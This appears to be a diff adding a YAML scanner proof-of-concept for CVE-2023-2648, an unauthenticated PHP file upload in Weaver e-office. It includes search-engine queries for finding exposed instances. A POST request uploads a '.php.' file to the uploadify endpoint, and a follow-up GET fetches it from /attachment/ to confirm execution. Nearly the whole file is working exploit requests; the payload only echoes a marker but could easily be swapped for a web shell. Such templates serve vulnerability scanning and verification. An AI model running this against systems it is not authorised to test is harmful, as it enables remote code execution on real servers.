@@ -1,0 +1,49 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="泛微-EOffice"
+    hunter-query: app.name=="泛微 e-office OA"
+    quake-query: app:"泛微 E-Office"
+    zoomeye-query: app:"泛微协同办公标准产品EOffice"
+    threatbook-query: 
+    cve: CVE-2023-2648
+    cnvd: 
+    
+name: poc-yaml-fanwei-e-office-uploadify-upload
+transport: http
+set:
+  s1: randomInt(10000,99999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /inc/jquery/uploadify/uploadify.php
+      follow_redirects: false
+      headers: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+      body: |
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition: form-data; name="Filedata"; filename="{{s1}}.php."
+        Content-Type: image/jpeg
+
+        <?php echo 4ra1n;?>
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+    expression: >-
+      "\\d+".matches(response.body_string) && response.status == 200 && response.raw_header.bcontains(b"text/html")
+    output:
+      search: |-
+        "(?P<token>\\w+)".bsubmatch(response.body)
+      token: search["token"]
+  r1:
+    request: 
+      method: GET
+      path: /attachment/{{token}}/{{s1}}.php  
+      follow_redirects: false
+    expression: >-
+      response.body_string.contains("4ra1n")  && response.status == 200
+expression: r0() && r1()
